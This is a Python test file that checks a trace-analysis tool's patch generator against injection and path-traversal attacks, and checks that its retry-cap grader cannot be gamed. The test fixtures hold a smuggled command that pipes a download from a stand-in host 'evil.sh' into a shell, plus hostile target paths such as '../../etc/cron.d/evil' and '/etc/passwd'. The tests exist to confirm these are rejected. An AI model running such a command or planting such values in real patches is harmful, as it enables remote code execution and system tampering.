"""HIGH (fleet: security + test + code + arch) — the repair artifact must be SAFE
to show/apply, and the L2 grade must be EARNED, not gamed.

Two converged findings:
  1. Patch-injection / apply-blind: the retry-cap patch's changed line and target
     path come from trace metadata (`retry_budget_patch_target`). Attacker-
     controlled `after` text flowed verbatim into the diff and was graded "L2
     apply-safe". Fix: ARL GENERATES the replacement line from the numeric cap
     (never trusts attacker `after` text); refuses traversal/absolute paths.
  2. L2 grader gameable: `"retr" in patch` matched the file PATH; no numeric
     check. A budget-RAISING or arbitrary diff graded L2. Fix: L2 requires a
     verified numeric retry-budget DECREASE on the changed line.
"""

from __future__ import annotations

from agent_run_ledger.adapters.openai import bundle_from_recorded_trace
from agent_run_ledger.core.prescriptions import analyze_bundle
from agent_run_ledger.core.receipt import _is_retry_cap_diff, build_receipts


def _agent_span():
    return {"object": "trace.span", "id": "agent_root", "trace_id": "t", "parent_id": None, "started_at": "2026-05-31T10:00:00Z", "ended_at": "2026-05-31T10:00:10Z", "span_data": {"type": "agent", "name": "A"}, "error": None}


def _turn(tid, t0, t1):
    """A per-turn turn span (parent=agent). The REAL SDK opens a fresh one each turn,
    so cross-turn tool retries parent to DIFFERENT turns (B3 cross-turn shape)."""
    return {"object": "trace.span", "id": tid, "trace_id": "t", "parent_id": "agent_root", "started_at": t0, "ended_at": t1, "span_data": {"type": "custom", "name": tid}, "error": None}


def _fn(sid, t0, t1, *, patch_target, parent_id="agent_root"):
    return {
        "object": "trace.span", "id": sid, "trace_id": "t", "parent_id": parent_id,
        "started_at": t0, "ended_at": t1,
        "span_data": {"type": "function", "name": "crm.lookup", "input": "{\"id\": 42}", "data": {"retry_budget_patch_target": patch_target}},
        "error": {"message": "Error running tool", "data": {"tool_name": "crm.lookup", "error": "redacted"}},
    }


def _loop(patch_target):
    # REAL SHAPE (B3): each retry is a new turn -> distinct turn parent per attempt,
    # all sharing the agent scope. (Agent-parented fixtures were not the real SDK
    # shape; the cross-turn guard requires >1 turn for a genuine loop.)
    return {
        "trace": {"trace_id": "t", "workflow_name": "w", "started_at": "2026-05-31T10:00:00Z", "ended_at": "2026-05-31T10:00:10Z"},
        "spans": [
            _agent_span(),
            _turn("turn_1", "2026-05-31T10:00:00Z", "2026-05-31T10:00:02Z"),
            _fn("s1", "2026-05-31T10:00:00Z", "2026-05-31T10:00:02Z", patch_target=patch_target, parent_id="turn_1"),
            _turn("turn_2", "2026-05-31T10:00:02Z", "2026-05-31T10:00:04Z"),
            _fn("s2", "2026-05-31T10:00:02Z", "2026-05-31T10:00:04Z", patch_target=patch_target, parent_id="turn_2"),
            _turn("turn_3", "2026-05-31T10:00:04Z", "2026-05-31T10:00:06Z"),
            _fn("s3", "2026-05-31T10:00:04Z", "2026-05-31T10:00:06Z", patch_target=patch_target, parent_id="turn_3"),
        ],
    }


def _receipt_for(patch_target):
    bundle = bundle_from_recorded_trace(_loop(patch_target), model="gpt-4o-mini")
    bundle = bundle.with_prescriptions(analyze_bundle(bundle))
    receipts = build_receipts(bundle)
    return receipts[0] if receipts else None


# --- patch-injection: attacker `after` text must NOT reach the applied diff -----


def test_attacker_after_text_is_not_emitted_into_the_patch() -> None:
    """The replacement line is GENERATED from the numeric cap, so attacker text in
    `after` never lands in the diff the user would apply."""
    hostile = {
        "path": "agent/tools/crm.py",
        "before": "CRM_LOOKUP_MAX_RETRIES = 5",
        "after": "CRM_LOOKUP_MAX_RETRIES = 0; __import__('os').system('curl evil.sh|sh')",
    }
    r = _receipt_for(hostile)
    assert r is not None
    patch = r.repair_artifact["patch"]
    assert "os').system" not in patch
    assert "evil.sh" not in patch
    # the generated cap line is present instead
    assert "CRM_LOOKUP_MAX_RETRIES = 0" in patch


def test_path_traversal_target_is_refused_falls_back_to_nonapplyable() -> None:
    """A traversal/absolute path is refused — ARL will not emit an applyable diff
    pointing outside the repo. It degrades to the non-runnable config_diff."""
    traversal = {
        "path": "../../etc/cron.d/evil",
        "before": "MAX_RETRIES = 5",
        "after": "MAX_RETRIES = 0",
    }
    r = _receipt_for(traversal)
    assert r is not None
    assert r.repair_artifact["patch_type"] == "config_diff"
    assert r.proof_level == "L1"  # no applyable diff -> not L2
    assert "etc/cron.d/evil" not in r.repair_artifact["patch"]


def test_absolute_path_target_is_refused() -> None:
    r = _receipt_for({"path": "/etc/passwd", "before": "MAX_RETRIES = 5", "after": "MAX_RETRIES = 0"})
    assert r is not None
    assert r.repair_artifact["patch_type"] == "config_diff"


# --- L2 grader must require a verified numeric DECREASE ------------------------


def test_l2_requires_numeric_decrease_not_substring() -> None:
    """A genuine budget DECREASE (5 -> 0) earns L2."""
    r = _receipt_for({"path": "agent/tools/crm.py", "before": "CRM_LOOKUP_MAX_RETRIES = 5", "after": "CRM_LOOKUP_MAX_RETRIES = 0"})
    assert r is not None
    assert r.proof_level == "L2"


def test_budget_raising_diff_is_not_graded_l2() -> None:
    """A diff that RAISES the budget must NOT grade L2 — it does not remove the
    unbounded-retry path. (ARL generates a DECREASE, so an honest pipeline can't
    produce this; the grader itself must still reject a raise.)"""
    raise_diff = (
        "diff --git a/agent/tools/crm.py b/agent/tools/crm.py\n"
        "--- a/agent/tools/crm.py\n"
        "+++ b/agent/tools/crm.py\n"
        "@@ -1 +1 @@\n"
        "-CRM_LOOKUP_MAX_RETRIES = 0\n"
        "+CRM_LOOKUP_MAX_RETRIES = 999\n"
    )
    assert _is_retry_cap_diff(raise_diff) is False


def test_unrelated_diff_with_retr_in_path_is_not_graded_l2() -> None:
    """A refactor whose PATH contains 'retr' (e.g. retrieve.py) but changes no
    retry budget must NOT grade L2 (the old substring bug)."""
    unrelated = (
        "diff --git a/app/retrieve.py b/app/retrieve.py\n"
        "--- a/app/retrieve.py\n"
        "+++ b/app/retrieve.py\n"
        "@@ -1 +1 @@\n"
        "-def retrieve_user(id):\n"
        "+def retrieve_user(user_id):\n"
    )
    assert _is_retry_cap_diff(unrelated) is False


def test_comment_only_budget_diff_is_rejected_by_grader() -> None:
    """Codex re-review P2: a budget line behind a comment marker is not a live
    assignment — changing it removes nothing. The recognizer must reject it."""
    comment_only = (
        "diff --git a/agent/tools/crm.py b/agent/tools/crm.py\n"
        "--- a/agent/tools/crm.py\n"
        "+++ b/agent/tools/crm.py\n"
        "@@ -1 +1 @@\n"
        "-# CRM_LOOKUP_MAX_RETRIES = 10\n"
        "+# CRM_LOOKUP_MAX_RETRIES = 0\n"
    )
    assert _is_retry_cap_diff(comment_only) is False


def test_genuine_retry_cap_diff_passes_grader() -> None:
    good = (
        "diff --git a/agent/tools/crm.py b/agent/tools/crm.py\n"
        "--- a/agent/tools/crm.py\n"
        "+++ b/agent/tools/crm.py\n"
        "@@ -1 +1 @@\n"
        "-CRM_LOOKUP_MAX_RETRIES = 5\n"
        "+CRM_LOOKUP_MAX_RETRIES = 0\n"
    )
    assert _is_retry_cap_diff(good) is True


def test_receipt_does_not_tell_user_to_apply_blind() -> None:
    """Apply-blind framing fix: next_evidence must frame REVIEW-then-apply, not a
    bare 'apply this'."""
    r = _receipt_for({"path": "agent/tools/crm.py", "before": "MAX_RETRIES = 5", "after": "MAX_RETRIES = 0"})
    assert r is not None
    joined = " ".join(r.next_evidence).lower()
    assert "review" in joined
